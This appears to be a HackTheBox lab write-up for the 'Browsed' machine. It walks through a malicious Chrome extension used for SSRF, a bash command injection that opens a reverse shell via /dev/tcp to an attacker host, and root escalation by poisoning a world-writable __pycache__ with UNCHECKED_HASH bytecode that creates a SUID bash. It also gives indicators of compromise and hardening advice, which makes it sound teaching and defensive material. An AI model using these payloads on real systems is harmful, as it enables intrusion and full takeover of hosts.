---
layout: writeup
title: "Browsed"
platform: HTB
os: Linux
difficulty: medium
date: 2026-03-13
description: "Chrome extension upload SSRF leading to Flask command injection, escalated via Python __pycache__ bytecode poisoning."
techniques:
  - "SSRF via Chrome Extension"
  - "Bash Command Injection"
  - "Python __pycache__ Poisoning"
  - "UNCHECKED_HASH Bytecode Compilation"
cve: []
---

# Browsed — Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Medium` \
> **Date:** 2026-03-13 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only 

---

## 0. Executive Summary

The "Browsed" machine demonstrates a sophisticated attack chain combining web application security, SSRF exploitation, and Python bytecode manipulation. An unauthenticated attacker could upload a malicious Chrome extension to achieve Server-Side Request Forgery (SSRF), leading to command injection in an internal Flask application. Subsequently, Python `__pycache__` poisoning enabled privilege escalation to root. The attack highlights the dangers of unrestricted extension uploads, insufficient input validation in privileged scripts, and world-writable cache directories. Immediate remediation of the extension upload mechanism and `__pycache__` permissions is critical.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Browsed"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain
```
Nmap → Chrome Extension Upload → SSRF to localhost:5000 → Flask Bash Injection → Reverse Shell (larry) → Python __pycache__ Poisoning → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `curl` | HTTP requests & file uploads |
| `python3` | HTTP server for exfiltration & payload compilation |
| `nc` | Reverse shell listener |
| `py_compile` | Python bytecode compilation with UNCHECKED_HASH mode |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -T4 -Pn initial <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 9.6p1 | Standard SSH banner |
| 80 | HTTP | nginx 1.24.0 (Ubuntu) | Web server with extension upload |

**Key Observations:**
- Minimal attack surface — only SSH and HTTP exposed externally
- Nginx reverse proxy configuration present
- No obvious version-specific CVEs

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** Manual inspection, `curl`, browser DevTools

**Findings:**
- Main page at `http://<target>/` displays sample website with three example Chrome extensions available for download
- Upload form at `http://<target>/upload.php` accepts `.zip` files
- Backend system tests uploaded extensions in headless Chrome
- Chrome logs accessible via `http://<target>/upload.php?output=1`
- Sample extensions: `fontify.zip`, `replaceimages.zip`, `timer.zip`

**Chrome Testing Environment:**
```
Extension temp path: /tmp/extension_XXXXX/
Chrome version: 134 (chrome-for-testing)
Runs as: www-data
Visits: http://localhost/ AND http://browsedinternals.htb/
```

**Internal Services Discovered via Chrome Logs:**
- `browsedinternals.htb:3000` — Gitea v1.24.5 (Git server)
- `localhost:5000` — Flask application (markdownPreview)

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Unrestricted Chrome Extension Upload with SSRF Capability

**Location:** `http://<target>/upload.php`

**Reasoning:**
The application accepts arbitrary Chrome extension uploads and executes them in a headless browser that visits both `localhost` and internal domains. This creates an SSRF vector — the extension's content scripts can access `localhost:5000` where a Flask application runs with a command injection vulnerability in the `/routines/<rid>` endpoint.

The Flask application's bash script uses:
```bash
if [[ "$1" -eq 0 ]]; then
```

This comparison fails when `$1` contains non-numeric characters, enabling bash command injection.

### 6.2 Exploitation

**Phase 1: Extension Development**

Modified the legitimate `fontify` extension to include malicious payload:
```javascript
// content.js - malicious beacon
const C2 = "<attacker-ip>";
const TARGET = "http://127.0.0.1:5000/routines/";
const cmd = `bash -c 'bash -i >& /dev/tcp/${C2}/9001 0>&1'`;
const b64 = btoa(cmd);
const sp = "%20";
const inject = `a[$(echo${sp}${b64}|base64${sp}-d|bash)]`;

setTimeout(() => {
  fetch(TARGET + inject, { mode: "no-cors" });
}, 2000);
```

**Phase 2: Packaging & Upload**
```bash
cd fontify_modified/
zip fontify_rce.zip content.js manifest.json popup.html popup.js style.css
curl -X POST -F "extension=@fontify_rce.zip" http://<target>/upload.php
```

**Phase 3: Reverse Shell**
```bash
# Listener
nc -lvnp 9001

# Shell received from target
# User: larry
# Directory: ~/markdownPreview
```

**Result:** User-level access obtained as `larry`.

**Key Insight:** The `mode: "no-cors"` flag was critical — standard fetch() failed due to CORS policies, but `no-cors` mode enabled fire-and-forget SSRF without requiring response validation.

---

## 7. Lateral Movement *(not applicable)*

Direct path from initial access to root via privilege escalation.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` — **CRITICAL FINDING**
- [x] SUID binaries — `find / -perm -4000 2>/dev/null`
- [x] Directory permissions inspection
- [ ] Cron jobs
- [ ] Capabilities
- [ ] Running processes
- [ ] LinPEAS

**Key Findings:**
```bash
larry@browsed:~$ sudo -l
User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

**Critical Directory Permissions:**
```bash
drwxrwxrwx 2 root root 4096 __pycache__/
```

The `__pycache__` directory is **world-writable**, enabling Python bytecode cache poisoning.

### 8.2 Escalation Vector

**Vector:** Python `__pycache__` Bytecode Poisoning

**Root Cause:** 
The privileged script `/opt/extensiontool/extension_tool.py` imports `extension_utils` module. Python checks `__pycache__/extension_utils.cpython-312.pyc` before loading the source `.py` file. The `__pycache__` directory has `drwxrwxrwx` permissions, allowing unprivileged users to replace compiled bytecode.

**Attack Methodology:**

1. **Create malicious module** replicating original function signatures
2. **Compile with `UNCHECKED_HASH` mode** to bypass timestamp validation
3. **Replace legitimate `.pyc`** in world-writable `__pycache__/`
4. **Trigger import via sudo** — root process executes malicious bytecode

**Exploitation:**
```bash
# Create malicious extension_utils.py
cat > extension_utils.py << 'PYCODE'
import os
import json
from jsonschema import validate, ValidationError

MANIFEST_SCHEMA = {
    "type": "object",
    "properties": {
        "manifest_version": {"type": "number"},
        "name": {"type": "string"},
        "version": {"type": "string"}
    },
    "required": ["manifest_version", "name", "version"]
}

def validate_manifest(path):
    # Malicious payload
    subprocess.run(['/bin/cp', '/bin/bash', '/tmp/rootbash'])
    subprocess.run(['/bin/chmod', '+s', '/tmp/rootbash'])
    
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    validate(instance=data, schema=MANIFEST_SCHEMA)
    return data

def clean_temp_files(extension_dir):
    exit(0)
PYCODE

# Compile with UNCHECKED_HASH (critical!)
python3 << 'PYEOF'
import py_compile
from py_compile import PycInvalidationMode

py_compile.compile(
    "extension_utils.py",
    cfile="extension_utils.cpython-312.pyc",
    invalidation_mode=PycInvalidationMode.UNCHECKED_HASH
)
PYEOF

# Poison the cache
cp extension_utils.cpython-312.pyc /opt/extensiontool/__pycache__/

# Trigger privileged execution
sudo /opt/extensiontool/extension_tool.py --ext Fontify

# Execute SUID bash
/tmp/rootbash -p
```

**Result:** Root/system-level access achieved.

**Technical Deep-Dive:**

`PycInvalidationMode.UNCHECKED_HASH` instructs Python to skip validation between the `.pyc` bytecode and source `.py` file. Without this flag, Python would detect the timestamp/hash mismatch and recompile from the original (safe) source. With `UNCHECKED_HASH`, Python blindly trusts the bytecode cache — enabling execution of arbitrary code at root privilege level.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Unrestricted Chrome Extension Upload Enabling SSRF | 🔴 Critical | `/upload.php` |
| 2 | Bash Command Injection in Flask Application | 🔴 Critical | `localhost:5000/routines/<rid>` |
| 3 | World-Writable Python `__pycache__` Directory | 🔴 Critical | `/opt/extensiontool/__pycache__/` |
| 4 | Sudo Permission for Script Importing from World-Writable Cache | 🔴 Critical | `sudo /opt/extensiontool/extension_tool.py` |
| 5 | Internal Services Accessible via SSRF | 🟠 High | `localhost:5000`, `browsedinternals.htb:3000` |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

**Network Level:**
- Outbound connections from web server process to unusual external IPs (reverse shell)
- HTTP requests to `localhost:5000` from Chrome process
- Base64-encoded bash commands in HTTP GET parameters

**System Level:**
- Chrome extension loaded from `/tmp/extension_XXXXX/` with unusual content
- Unexpected `.pyc` files in `/opt/extensiontool/__pycache__/` owned by non-root users
- Creation of SUID bash binary at `/tmp/rootbash`
- Python subprocess execution of `/bin/cp` and `/bin/chmod` from privileged script

**Log Artifacts:**
```
[Chrome] Extension error: ...
[nginx] POST /upload.php - 200
[nginx] GET /upload.php?output=1 - 200
[Flask] 127.0.0.1 - - GET /routines/a[$(echo...)] - 200
[sudo] larry : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/opt/extensiontool/extension_tool.py
```

### 10.2 Security Weaknesses

**Application Design:**
- Extension upload accepts arbitrary code without sandboxing or validation
- Headless Chrome has unrestricted localhost access
- Flask application trusts user input in shell command context
- No Content Security Policy on uploaded extensions

**System Configuration:**
- Python bytecode cache directory has overly permissive permissions (777)
- Sudo configuration allows execution of script importing from writable locations
- No integrity checking on Python module imports

**Defense-in-Depth Failures:**
- No network segmentation between web-facing services and internal applications
- Internal Flask application lacks authentication
- No AppArmor/SELinux policies restricting Chrome or Python processes

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| **Immediate** | Remove sudo permission for `extension_tool.py` OR restrict `__pycache__` permissions to `drwxr-xr-x` (root-only writable) | Finding #3, #4 |
| **Immediate** | Implement strict extension validation: manifest schema enforcement, CSP policies, permission allowlisting | Finding #1 |
| **Immediate** | Replace Flask bash script with Python subprocess calls using lists (no shell=True) | Finding #2 |
| **Short-term** | Implement network segmentation: internal services should not be accessible from Chrome browser context | Finding #5 |
| **Short-term** | Add authentication to all internal services (Flask, Gitea) | Finding #2, #5 |
| **Short-term** | Enable Python hash-based `.pyc` validation in production (disable UNCHECKED_HASH mode systemwide) | Finding #3 |
| **Long-term** | Implement extension sandboxing: run Chrome in restricted container/VM without localhost access | Finding #1 |
| **Long-term** | Deploy AppArmor/SELinux mandatory access controls for web services | Overall system hardening |
| **Long-term** | Implement file integrity monitoring on system directories including `__pycache__` | Finding #3 |

---

## 11. Lessons Learned

**SSRF Detection via Timing Analysis:**
When standard response-based SSRF enumeration failed (CORS blocks, no response data), **timing-based detection** proved effective:
- Closed ports: instant failure (0-5ms)
- Open ports: delayed response (10-50ms+)

This technique bypasses CORS restrictions and works even when response data cannot be read.

**Python Bytecode Cache Security:**
Python's `__pycache__` mechanism is a **privilege escalation vector** when:
1. Cache directory is world-writable
2. Privileged process imports modules from that directory
3. `PycInvalidationMode.UNCHECKED_HASH` is used (or .pyc compiled with it)

**Critical insight:** Even with source integrity, bytecode cache poisoning enables arbitrary code execution. Cache directories MUST have restrictive permissions (755 or stricter).

**Extension-Based SSRF:**
Modern web applications increasingly accept "harmless" user content (browser extensions, plugins, themes) without realizing these can execute arbitrary JavaScript with **full localhost access**. The `mode: "no-cors"` flag in Fetch API is particularly dangerous for SSRF — it enables fire-and-forget requests that bypass same-origin policy.

**Defense Evasion:**
- Standard environment variable injection (`PYTHONPATH`) was blocked by sudo's `env_reset`
- `.pth` file injection failed (only works in `site-packages`, not `__pycache__`)
- Direct source file modification was prevented by permissions

The attack succeeded by exploiting Python's **trusted bytecode cache** mechanism — a subtle vector that bypasses traditional file integrity checks.

---

*End of Report*

*Classification: Public — flags and sensitive values redacted per active box policy*

*Full technical details available upon box retirement*
